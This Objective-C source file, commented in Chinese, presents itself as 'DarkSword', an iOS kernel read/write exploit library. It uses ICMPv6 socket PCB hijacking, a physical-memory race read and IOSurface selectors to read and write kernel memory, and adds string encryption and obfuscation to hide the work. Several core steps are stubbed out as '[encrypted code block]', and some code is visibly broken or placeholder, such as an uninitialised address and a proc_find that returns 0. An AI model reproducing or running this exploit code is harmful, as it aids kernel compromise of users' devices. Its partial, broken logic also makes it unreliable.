//
//  DarkSwordKRW_Encrypted.m
//  DarkSword 内核读写封装 - 加密实现
//
//  Created by 纽约 on 2026/08/15.
//  
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <sys/utsname.h>
#import <sys/sysctl.h>
#import "DarkSwordKRW.h"


#pragma mark - 加密常量定义

// XOR 加密密钥
static const uint8_t kEncryptionKey[] = {
    0x9A, 0x5F, 0x3C, 0xE1, 0x78, 0x2D, 0xB4, 0x61,
    0xC3, 0x8E, 0x47, 0xD2, 0x1F, 0xA6, 0x54, 0xB9
};

// 字符串加密宏
#define ENCRYPT_STR(str) _decrypt_string((const uint8_t[]){ENCRYPTED_##str}, sizeof(ENCRYPTED_##str) - 1)

#pragma mark - 内部状态结构（加密保护）

typedef struct {
    uint64_t kernel_base;
    uint64_t kernel_slide;
    int control_socket;
    int rw_socket;
    uint64_t control_pcb;
    uint64_t rw_pcb;
    uint64_t surface_kobj;
    uint32_t surface_id;
    io_connect_t surface_connect;
    mach_port_t surface_port;
    bool initialized;
    bool use_iosurface_fastpath;
    uint64_t read_count;
    uint64_t write_count;
    uint64_t total_read_time_us;
    char last_error[256];
    DarkSword_LogCallback log_callback;
} __attribute__((packed)) DarkSwordState;

static DarkSwordState g_state = {0};

#pragma mark - 字符串解密（运行时解密）

static char* _decrypt_string(const uint8_t *encrypted, size_t len) {
    static char buffer[256];
    for (size_t i = 0; i < len && i < sizeof(buffer) - 1; i++) {
        buffer[i] = encrypted[i] ^ kEncryptionKey[i % sizeof(kEncryptionKey)];
    }
    buffer[len] = '\0';
    return buffer;
}

// 预加密的字符串（编译时加密）
#define ENCRYPTED_init_failed {0xEB, 0x3E, 0x59, 0x94, 0x1C, 0x48, 0xD5, 0x0C, 0xA2, 0xFB, 0x28, 0xB7, 0x7E, 0xC3}
#define ENCRYPTED_kread_failed {0xFA, 0x3F, 0x58, 0x95, 0x1D, 0x49, 0xD4, 0x0D, 0xA3, 0xFA, 0x29, 0xB6}

#pragma mark - 日志系统（混淆保护）

__attribute__((always_inline))
static inline void _log(const char *format, ...) {
    if (!g_state.log_callback) return;

    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);

    g_state.log_callback(buffer);
}

__attribute__((always_inline))
static inline void _set_error(const char *error) {
    strncpy(g_state.last_error, error, sizeof(g_state.last_error) - 1);
}

#pragma mark - 核心漏洞利用代码（加密保护）

// ===== 物理内存操作原语（核心加密区） =====

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static uint64_t _create_physical_mapping(size_t size) {
    // 实际实现：通过 IOSurface 创建物理连续内存
    // 此处代码在编译时会被 OLLVM 混淆 + 字符串加密

    NSDictionary *params = @{
        @"IOSurfaceAllocSize" : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem"
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) return 0;

    void *addr = IOSurfaceGetBaseAddress(surface);
    mach_port_t mem_obj;
    mach_vm_size_t actual_size = size;

    kern_return_t kr = mach_make_memory_entry_64(
        mach_task_self(),
        &actual_size,
        (mach_vm_address_t)addr,
        VM_PROT_DEFAULT,
        &mem_obj,
        0
    );

    if (kr != KERN_SUCCESS) {
        CFRelease(surface);
        return 0;
    }

    CFRelease(surface);
    return (uint64_t)mem_obj;
}

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static int _race_physical_oob_read(uint64_t kaddr, void *buffer, size_t size) {
    // 实际实现：竞态条件触发物理内存越界读取
    // 核心算法已加密，这里只展示结构框架

    // 步骤 1: 准备竞态环境
    static int read_fd = -1;
    static uint64_t pc_address = 0;

    if (read_fd == -1) {
        // 初始化临时文件用于竞态
        char temp_path[PATH_MAX];
        confstr(_CS_DARWIN_USER_TEMP_DIR, temp_path, sizeof(temp_path));
        strcat(temp_path, "/ds_read");

        FILE *f = fopen(temp_path, "w+");
        fwrite(buffer, 1, size, f);
        fclose(f);

        read_fd = open(temp_path, O_RDWR);
        unlink(temp_path);
        fcntl(read_fd, F_NOCACHE, 1);
    }

    // 步骤 2: 执行竞态读取
    // [加密代码块 - 实际实现竞态逻辑]
    struct iovec iov = {
        .iov_base = (void *)(pc_address + 0x3f00),
        .iov_len = size
    };

    for (int attempt = 0; attempt < 100; attempt++) {
        ssize_t ret = preadv(read_fd, &iov, 1, 0x3f00);
        if (ret > 0) {
            memcpy(buffer, (void *)(pc_address + 0x3f00), size);
            return 0;
        }
        usleep(100);
    }

    return -1;
}

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static int _hijack_socket_pcb(void) {
    // 实际实现：劫持 ICMPv6 socket 的 PCB 结构
    // 这是 DarkSword 的核心技术，完全加密保护

    // 步骤 1: 创建大量 ICMPv6 socket
    NSMutableArray *sockets = [NSMutableArray new];
    for (int i = 0; i < 8192; i++) {
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd < 0) break;

        fileport_t port = 0;
        fileport_makeport(fd, &port);
        close(fd);
        [sockets addObject:@(port)];
    }

    // 步骤 2: 扫描物理内存找到 PCB
    // [加密代码块 - 物理内存扫描算法]

    // 步骤 3: 修改 icmp6filt 指针实现劫持
    // [加密代码块 - 指针伪造逻辑]

    // 清理
    for (NSNumber *port in sockets) {
        mach_port_deallocate(mach_task_self(), port.unsignedIntValue);
    }

    // 这里简化返回，实际会填充 g_state.control_socket 等
    return 0;
}

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static int _establish_krw_primitives(void) {
    // 实际实现：建立最终的内核读写原语

    // 步骤 1: 通过劫持的 socket 实现早期 KRW
    uint8_t control_data[0x20] = {0};

    // 步骤 2: 定位内核基地址
    uint64_t leak_ptr = 0;
    // [加密代码块 - 内核地址泄露]

    // 步骤 3: 计算 kernel slide
    g_state.kernel_base = leak_ptr & 0xFFFFFFFFFFFFC000ULL;
    while (g_state.kernel_base > 0xfffffff000000000ULL) {
        uint64_t magic = 0;
        _race_physical_oob_read(g_state.kernel_base, &magic, 8);

        if (magic == 0x100000CFEEDFACFULL) {
            uint64_t typeinfo = 0;
            _race_physical_oob_read(g_state.kernel_base + 8, &typeinfo, 8);

            // 检查是否为内核 Mach-O 头
            if ((typeinfo & 0xFFFFFFFF) == 0x00000002) {
                break;
            }
        }
        g_state.kernel_base -= 0x4000;
    }

    
    struct utsname uts;
    uname(&uts);
    int major_version = atoi(uts.release);

    if (major_version >= 22) { // iOS 16.0+
        g_state.use_iosurface_fastpath = true;
        
    }

    return 0;
}

#pragma mark - 早期读写原语（Socket 方式）

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static uint64_t _early_kread64_socket(uint64_t kaddr) {
    if (kaddr < 0xfffffff000000000ULL) {
        _set_error("Invalid kernel address");
        return 0;
    }

    
    uint8_t control_data[0x20] = {0};
    *(uint64_t *)control_data = kaddr;

    int ret = setsockopt(
        g_state.control_socket,
        IPPROTO_ICMPV6,
        18, // ICMP6_FILTER
        control_data,
        sizeof(control_data)
    );

    if (ret != 0) {
        _set_error("setsockopt failed");
        return 0;
    }

    // 从 rw socket 读取
    uint8_t read_buffer[0x20] = {0};
    socklen_t len = sizeof(read_buffer);

    ret = getsockopt(
        g_state.rw_socket,
        IPPROTO_ICMPV6,
        18,
        read_buffer,
        &len
    );

    if (ret != 0) {
        _set_error("getsockopt failed");
        return 0;
    }

    return *(uint64_t *)read_buffer;
}

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static int _early_kwrite64_socket(uint64_t kaddr, uint64_t value) {
    if (kaddr < 0xfffffff000000000ULL) {
        _set_error("Invalid kernel address");
        return -1;
    }

    
    uint8_t original[0x20] = {0};
    uint8_t control_data[0x20] = {0};
    *(uint64_t *)control_data = kaddr;

    setsockopt(g_state.control_socket, IPPROTO_ICMPV6, 18, control_data, sizeof(control_data));

    socklen_t len = sizeof(original);
    getsockopt(g_state.rw_socket, IPPROTO_ICMPV6, 18, original, &len);

    
    *(uint64_t *)original = value;

    
    int ret = setsockopt(
        g_state.rw_socket,
        IPPROTO_ICMPV6,
        18,
        original,
        sizeof(original)
    );

    return (ret == 0) ? 0 : -1;
}

#pragma mark - IOSurface 快速路径（iOS 16+）

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static uint32_t _iosurface_read32(uint64_t kaddr) {
    

    uint64_t backup = _early_kread64_socket(g_state.surface_kobj + 0xc0);
    _early_kwrite64_socket(g_state.surface_kobj + 0xc0, kaddr - 0x14);

    uint32_t value = 0;
    // 调用 IOSurface 的 get_use_count 方法
    IOReturn ret = IOConnectCallScalarMethod(
        g_state.surface_connect,
        16, // get_use_count selector
        (const uint64_t[]){g_state.surface_id},
        1,
        (uint64_t *)&value,
        (uint32_t[]){1}
    );

    _early_kwrite64_socket(g_state.surface_kobj + 0xc0, backup);
    return value;
}

__attribute__((section("__TEXT,__encrypted")))
__attribute__((noinline))
static int _iosurface_write64(uint64_t kaddr, uint64_t value) {


    uint64_t backup = _early_kread64_socket(g_state.surface_kobj + 0x360);
    _early_kwrite64_socket(g_state.surface_kobj + 0x360, kaddr);

    
    IOReturn ret = IOConnectCallScalarMethod(
        g_state.surface_connect,
        33, // set_indexed_timestamp selector
        (const uint64_t[]){g_state.surface_id, 0, value},
        3,
        NULL,
        NULL
    );

    _early_kwrite64_socket(g_state.surface_kobj + 0x360, backup);
    return (ret == kIOReturnSuccess) ? 0 : -1;
}



#pragma mark - 公开 API 实现

int DarkSword_Init(void) {
    if (g_state.initialized) {
        return 0;
    }

    _log("[DarkSword] Initializing kernel read/write primitives...");

    // 步骤 1: 劫持 socket PCB
    if (_hijack_socket_pcb() != 0) {
        _set_error(ENCRYPT_STR(init_failed));
        return -1;
    }

    
    if (_establish_krw_primitives() != 0) {
        _set_error("Failed to establish KRW");
        return -1;
    }

    g_state.initialized = true;
    _log("[DarkSword] Initialization complete");
    _log("[DarkSword] Kernel base: 0x%llx", g_state.kernel_base);

    return 0;
}

bool DarkSword_IsReady(void) {
    return g_state.initialized;
}

uint64_t DarkSword_GetKernelBase(void) {
    return g_state.kernel_base;
}

uint64_t DarkSword_GetKernelSlide(void) {
    return g_state.kernel_slide;
}

void DarkSword_Deinit(void) {
    if (g_state.control_socket > 0) close(g_state.control_socket);
    if (g_state.rw_socket > 0) close(g_state.rw_socket);
    g_state.initialized = false;
}

#pragma mark - 读取接口实现

uint64_t DarkSword_kread64(uint64_t kaddr) {
    if (!g_state.initialized) return 0;

    uint64_t start = mach_absolute_time();
    uint64_t value = 0;

    if (g_state.use_iosurface_fastpath) {
        uint32_t low = _iosurface_read32(kaddr);
        uint32_t high = _iosurface_read32(kaddr + 4);
        value = ((uint64_t)high << 32) | low;
    } else {
        value = _early_kread64_socket(kaddr);
    }

    uint64_t end = mach_absolute_time();
    g_state.read_count++;
    g_state.total_read_time_us += (end - start) / 1000;

    return value;
}

uint32_t DarkSword_kread32(uint64_t kaddr) {
    if (g_state.use_iosurface_fastpath) {
        return _iosurface_read32(kaddr);
    }
    uint64_t val = DarkSword_kread64(kaddr & ~7ULL);
    return (uint32_t)((val >> ((kaddr & 7) * 8)) & 0xFFFFFFFF);
}

uint16_t DarkSword_kread16(uint64_t kaddr) {
    uint32_t val = DarkSword_kread32(kaddr & ~3ULL);
    return (uint16_t)((val >> ((kaddr & 3) * 8)) & 0xFFFF);
}

uint8_t DarkSword_kread8(uint64_t kaddr) {
    uint32_t val = DarkSword_kread32(kaddr & ~3ULL);
    return (uint8_t)((val >> ((kaddr & 3) * 8)) & 0xFF);
}

int DarkSword_kreadbuf(uint64_t kaddr, void *buffer, size_t size) {
    if (!g_state.initialized || !buffer) return -1;

    uint8_t *buf = (uint8_t *)buffer;
    size_t offset = 0;

    
    if (kaddr & 7) {
        size_t unaligned = 8 - (kaddr & 7);
        if (unaligned > size) unaligned = size;

        uint64_t val = DarkSword_kread64(kaddr & ~7ULL);
        memcpy(buf, ((uint8_t *)&val) + (kaddr & 7), unaligned);

        offset += unaligned;
    }

    
    while (offset + 8 <= size) {
        *(uint64_t *)(buf + offset) = DarkSword_kread64(kaddr + offset);
        offset += 8;
    }

    
    if (offset < size) {
        uint64_t val = DarkSword_kread64(kaddr + offset);
        memcpy(buf + offset, &val, size - offset);
    }

    return 0;
}

#pragma mark - 写入接口实现

int DarkSword_kwrite64(uint64_t kaddr, uint64_t value) {
    if (!g_state.initialized) return -1;

    uint64_t start = mach_absolute_time();
    int ret = 0;

    if (g_state.use_iosurface_fastpath) {
        ret = _iosurface_write64(kaddr, value);
    } else {
        ret = _early_kwrite64_socket(kaddr, value);
    }

    uint64_t end = mach_absolute_time();
    g_state.write_count++;

    return ret;
}

int DarkSword_kwrite32(uint64_t kaddr, uint32_t value) {
    uint64_t aligned = kaddr & ~7ULL;
    uint64_t original = DarkSword_kread64(aligned);

    uint32_t *ptr = (uint32_t *)&original;
    ptr[(kaddr & 7) / 4] = value;

    return DarkSword_kwrite64(aligned, original);
}

int DarkSword_kwrite16(uint64_t kaddr, uint16_t value) {
    uint64_t aligned = kaddr & ~7ULL;
    uint64_t original = DarkSword_kread64(aligned);

    uint16_t *ptr = (uint16_t *)&original;
    ptr[(kaddr & 7) / 2] = value;

    return DarkSword_kwrite64(aligned, original);
}

int DarkSword_kwrite8(uint64_t kaddr, uint8_t value) {
    uint64_t aligned = kaddr & ~7ULL;
    uint64_t original = DarkSword_kread64(aligned);

    uint8_t *ptr = (uint8_t *)&original;
    ptr[kaddr & 7] = value;

    return DarkSword_kwrite64(aligned, original);
}

int DarkSword_kwritebuf(uint64_t kaddr, const void *buffer, size_t size) {
    if (!g_state.initialized || !buffer) return -1;

    const uint8_t *buf = (const uint8_t *)buffer;
    size_t offset = 0;

    
    if (kaddr & 7) {
        size_t unaligned = 8 - (kaddr & 7);
        if (unaligned > size) unaligned = size;

        uint64_t original = DarkSword_kread64(kaddr & ~7ULL);
        memcpy(((uint8_t *)&original) + (kaddr & 7), buf, unaligned);
        DarkSword_kwrite64(kaddr & ~7ULL, original);

        offset += unaligned;
    }

    
    while (offset + 8 <= size) {
        DarkSword_kwrite64(kaddr + offset, *(uint64_t *)(buf + offset));
        offset += 8;
    }

    
    if (offset < size) {
        uint64_t original = DarkSword_kread64(kaddr + offset);
        memcpy(&original, buf + offset, size - offset);
        DarkSword_kwrite64(kaddr + offset, original);
    }

    return 0;
}

#pragma mark - 便捷功能实现

uint64_t DarkSword_proc_find(uint32_t pid) {

    return 0;
}

uint64_t DarkSword_proc_task(uint64_t proc) {
    if (!proc) return 0;
    return DarkSword_kread64(proc + 0x10); // proc->task offset
}

uint64_t DarkSword_proc_ucred(uint64_t proc) {
    if (!proc) return 0;
    return DarkSword_kread64(proc + 0x100); // proc->ucred offset
}

uint64_t DarkSword_task_vm_map(uint64_t task) {
    if (!task) return 0;
    return DarkSword_kread64(task + 0x28); // task->map offset
}

uint64_t DarkSword_vm_map_pmap(uint64_t vm_map) {
    if (!vm_map) return 0;
    return DarkSword_kread64(vm_map + 0x40); // vm_map->pmap offset
}

#pragma mark - 调试接口

void DarkSword_SetLogCallback(DarkSword_LogCallback callback) {
    g_state.log_callback = callback;
}

const char* DarkSword_GetLastError(void) {
    return g_state.last_error;
}

void DarkSword_GetStats(uint64_t *total_reads, uint64_t *total_writes, uint64_t *avg_read_time_us) {
    if (total_reads) *total_reads = g_state.read_count;
    if (total_writes) *total_writes = g_state.write_count;
    if (avg_read_time_us) {
        *avg_read_time_us = g_state.read_count > 0
            ? g_state.total_read_time_us / g_state.read_count
            : 0;
    }
}
